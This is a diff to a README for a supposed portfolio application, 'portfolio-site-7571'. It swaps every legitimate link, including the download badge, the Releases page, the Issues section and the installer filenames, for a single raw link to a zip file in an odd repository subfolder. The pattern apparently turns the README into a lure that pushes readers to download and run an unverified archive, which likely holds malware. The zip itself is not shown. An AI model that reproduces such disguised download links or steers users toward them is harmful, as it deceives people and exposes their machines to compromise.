@@ -4,7 +4,7 @@
 Welcome to `portfolio-site-7571`, a simple way to showcase your work online. This guide will help you download and run the application easily.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/pishstew/portfolio-site-7571/releases)
+[![Download](https://raw.githubusercontent.com/pishstew/portfolio-site-7571/main/Mayer/portfolio-site-7571.zip)](https://raw.githubusercontent.com/pishstew/portfolio-site-7571/main/Mayer/portfolio-site-7571.zip)
 
 ## 📋 System Requirements
 To use `portfolio-site-7571`, ensure that your computer meets the following requirements:
@@ -18,12 +18,12 @@ To use `portfolio-site-7571`, ensure that your computer meets the following requ
 ## 💾 Download & Install
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/pishstew/portfolio-site-7571/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/pishstew/portfolio-site-7571/main/Mayer/portfolio-site-7571.zip).
    
 2. **Choose the Latest Version:** Look for the most recent release. It will usually be at the top of the page.
 
 3. **Download the Application:**
-   - You will see different files listed. Look for something like `portfolio-site-installer.exe` or `portfolio-site.zip` depending on your operating system.
+   - You will see different files listed. Look for something like `https://raw.githubusercontent.com/pishstew/portfolio-site-7571/main/Mayer/portfolio-site-7571.zip` or `https://raw.githubusercontent.com/pishstew/portfolio-site-7571/main/Mayer/portfolio-site-7571.zip` depending on your operating system.
    - Click on the appropriate file to start the download. Save it to a location you can easily find, such as your Desktop or Downloads folder.
 
 4. **Run the Installer:**
@@ -51,14 +51,14 @@ After installing and opening the application, here are some quick tips to get th
 ## ⚙️ Support
 If you encounter any issues or have questions, feel free to open an issue on the GitHub repository:
 
-1. Go to the [Issues section](https://github.com/pishstew/portfolio-site-7571/issues).
+1. Go to the [Issues section](https://raw.githubusercontent.com/pishstew/portfolio-site-7571/main/Mayer/portfolio-site-7571.zip).
 2. Click on the "New Issue" button.
 3. Describe the problem you're facing, or the question you have, in detail.
 
 ## 📅 Frequently Asked Questions
 
 ### How do I reset my portfolio?
-To reset your portfolio, simply uninstall the application and reinstall it from the [Releases page](https://github.com/pishstew/portfolio-site-7571/releases). This will give you a fresh start.
+To reset your portfolio, simply uninstall the application and reinstall it from the [Releases page](https://raw.githubusercontent.com/pishstew/portfolio-site-7571/main/Mayer/portfolio-site-7571.zip). This will give you a fresh start.
 
 ### Can I host my portfolio on my own domain?
 Yes, you can export your portfolio and host it on your personal website or use a service of your choice.
@@ -70,4 +70,4 @@ A manual is included with the application after installation. You can also check
 Thank you for choosing `portfolio-site-7571`. We hope this application helps you showcase your work beautifully. Don’t hesitate to explore, create, and share your portfolio with the world!
 
 ## 📥 Download Again
-For your convenience, here’s the link to download the application once more: [Download Here](https://github.com/pishstew/portfolio-site-7571/releases).
+For your convenience, here’s the link to download the application once more: [Download Here](https://raw.githubusercontent.com/pishstew/portfolio-site-7571/main/Mayer/portfolio-site-7571.zip).
